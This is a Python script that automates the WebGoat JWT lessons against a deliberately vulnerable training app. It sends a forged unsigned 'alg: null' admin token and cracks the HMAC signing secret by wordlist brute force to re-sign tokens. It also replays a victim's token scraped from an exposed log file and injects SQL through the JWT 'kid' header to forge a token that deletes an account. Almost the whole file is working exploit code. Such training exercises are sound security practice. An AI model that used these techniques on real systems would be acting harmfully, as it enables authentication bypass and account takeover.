import base64
import hashlib
import hmac
import json
import re
import requests
import time

HOST_IP = "__HOST_IP__"
USERNAME = "__USERNAME__"
PASSWORD = "__PASSWORD__"
BASE_URL = f"http://{HOST_IP}:8080/WebGoat"
LOG_URL = f"{BASE_URL}/images/logs.txt"
JWT_SIGNING_VOTING = f"{BASE_URL}/JWT/votings"
JWT_CRACKING = f"{BASE_URL}/JWT/secret"
JWT_REFRESH_LOGIN = f"{BASE_URL}/JWT/refresh/login"
JWT_REFRESH_URL = f"{BASE_URL}/JWT/refresh"
JWT_CHECKOUT_URL = f"{BASE_URL}/JWT/refresh/checkout"
JWT_DELETE = f"{BASE_URL}/JWT/final/delete"


def create_session():
    """Creates a session for authentication."""
    s = requests.Session()
    s.headers.update({
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Host": f"{HOST_IP}:8080",
        "Origin": BASE_URL,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    })
    return s


def login(session):
    """Logs in using the provided session."""
    login_url = f"{BASE_URL}/login"
    r = session.post(login_url, data={"username": USERNAME, "password": PASSWORD})
    if r.status_code != 200:
        print(f"Error: Login failed. Status code: {r.status_code}")
        print(f"Response: {r.text}")
        exit(1)


def load_resources(session):
    """Loads necessary resources for the WebGoat lessons."""
    resources = [
            "welcome.mvc", "start.mvc", "service/labels.mvc", "service/lessonmenu.mvc", "service/lessonoverview.mvc", "WebGoatIntroduction.lesson.lesson", "JWT.lesson.lesson"]

    for resource in resources:
        r = session.get(f"{BASE_URL}/{resource}")
        if r.status_code != 200:
            print(f"Error: Failed to load {resource}. Status code: {r.status_code}")
            exit(1)


def jwt_signing(session):
    """JWT Signing lesson."""
    jsession_cookie = session.cookies.get("JSESSIONID")
    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Length": "0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": f"access_token=eyJhbGciOiBudWxsfQ.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.; JSESSIONID={jsession_cookie}",
        "Host": f"{HOST_IP}:8080",
        "Referer": f"{BASE_URL}/start.mvc",
        "X-Requested-With": "XMLHttpRequest"
    }
    r = session.post(JWT_SIGNING_VOTING, headers=headers, verify=False)
    print("JWT Signing Response:", r.text)


def get_jwt_token(session):
    r = session.get(f"{BASE_URL}/JWT/secret/gettoken")   
    
    if r.status_code == 200:
        print(f"JWT Token: {r.text}")
        return r.text
    else:
        print(f"Error fetching JWT token. Status: {r.status_code}")


def jwt_cracking(session):
    """JWT Cracking lesson."""
    #token = input('Enter the JWT token for cracking: ')
    token = get_jwt_token(session)
    token = token.split('.')
    if len(token) != 3:
        print("Invalid JWT format.")
        return

    unsigned_token = (token[0] + '.' + token[1]).encode()
    signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()

    with open('google-10000-english.txt', 'r') as fd:
        lines = [line.rstrip('\n').encode() for line in fd]

    def hmac_base64(key, message):
        return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))

    decoded_payload = json.loads(base64.urlsafe_b64decode(token[1] + '=' * (-len(token[1]) % 4)).decode())
    decoded_payload["username"] = "WebGoat"

    new_payload = base64.urlsafe_b64encode(json.dumps(decoded_payload, separators=(',', ':')).encode()).decode().rstrip('=')

    for line in lines:
        test = hmac_base64(line, unsigned_token)
        if test == signature:
            print('Key found:', line.decode())
            new_token = (token[0] + '.' + new_payload).encode()
            new_signature = hmac_base64(line, new_token)
            new_token += ('.' + new_signature.decode().rstrip('=')).encode()
            print('New token:', new_token.decode())
            break
    else:
        print("No matching key found in dictionary.")

    headers = {
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Length": "0",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": f"{HOST_IP}:8080",
        "Referer": f"{BASE_URL}/start.mvc",
        "X-Requested-With": "XMLHttpRequest"
    }
    data = {"token": f"{new_token.decode()}"}
    r = session.post(JWT_CRACKING, headers=headers, data=data, verify=False)
    print(r.text)


def jwt_refresh_token(session):
    """JWT Refresh Token lesson."""
    r = session.get(LOG_URL)
    if r.status_code != 200:
        print("Error: Failed to retrieve log file.")
        exit(1)

    logs = r.text
    match = re.search(r'token=([\w-]+\.[\w-]+\.[\w-]+)', logs)
    if not match:
        print("Error: Token not found in logs.")
        exit(1)

    tom_access_token = match.group(1)

    headers = {"Content-Type": "application/json"}
    payload = {"user": "Jerry", "password": "bm5nhSkxCXZkKRy4"}
    r = session.post(JWT_REFRESH_LOGIN, headers=headers, data=json.dumps(payload))
    if r.status_code == 200:
        try:
            jerry_refresh_token = r.json().get("refresh_token")
            print("Jerry's Refresh Token:", jerry_refresh_token)
        except json.JSONDecodeError:
            print("Failed to decode JSON response.")
    else:
        print(f"Request failed with status code {r.status_code}: {r.text}")

    url = f"{JWT_REFRESH_URL}/newToken"
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {tom_access_token}", "Accept": "application/json"}
    r = session.post(url, json={"refresh_token": jerry_refresh_token}, headers=headers)
    if r.status_code != 200:
        print(f"Error: Failed to refresh token. Status code: {r.status_code}")
        print(f"Response: {r.text}")
        exit(1)

    tom_access_token_new = r.json().get("access_token")
    headers = {"Authorization": f"Bearer {tom_access_token_new}"}
    r = session.post(JWT_CHECKOUT_URL, headers=headers)
    if r.status_code != 200:
        print(f"Error: Checkout failed. Status code: {r.status_code}")
        print(f"Response: {r.text}")
        exit(1)

    print("Checkout Response:", r.text)


def jwt_final_challenges(session):
    """JWT Final Challenges lesson."""
    token = "eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJqZXJyeUB3ZWJnb2F0LmNvbSIsInVzZXJuYW1lIjoiSmVycnkiLCJFbWFpbCI6ImplcnJ5QHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.CgZ27DzgVW8gzc0n6izOU638uUCi6UhiOJKYzoEZGE8"
    token = token.split('.')
    decoded_header = json.loads(base64.urlsafe_b64decode(token[0] + '=' * (-len(token[0]) % 4)).decode())
    decoded_header["kid"] = """hacked' UNION select 'ZGVsZXRpbmdUb20=' from 
INFORMATION_SCHEMA.SYSTEM_USERS --"""

    unsigned_token = (token[0] + '.' + token[1]).encode()
    signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()

    def hmac_base64(key, message):
        return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))

    decoded_payload = json.loads(base64.urlsafe_b64decode(token[1] + '=' * (-len(token[1]) % 4)).decode())
    decoded_payload["username"] = "Tom"
    current_time = int(time.time())
    decoded_payload["iat"] = current_time
    decoded_payload["exp"] = current_time + (2 * 60 * 60)

    new_header = base64.urlsafe_b64encode(json.dumps(decoded_header, separators=(',', ':')).encode()).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(json.dumps(decoded_payload, separators=(',', ':')).encode()).decode().rstrip('=')

    new_token = (new_header + '.' + new_payload).encode()
    new_signature = hmac_base64("deletingTom".encode(), new_token)
    new_token += ('.' + new_signature.decode().rstrip('=')).encode()

    params = {"token": new_token.decode()}
    r = session.post(JWT_DELETE, params=params)
    print(f"Delete JWT Response: {r.text}")


def main():
    session = create_session()
    login(session)
    load_resources(session)

    jwt_signing(session)
    jwt_cracking(session)
    jwt_refresh_token(session)
    jwt_final_challenges(session)


if __name__ == "__main__":
    main()
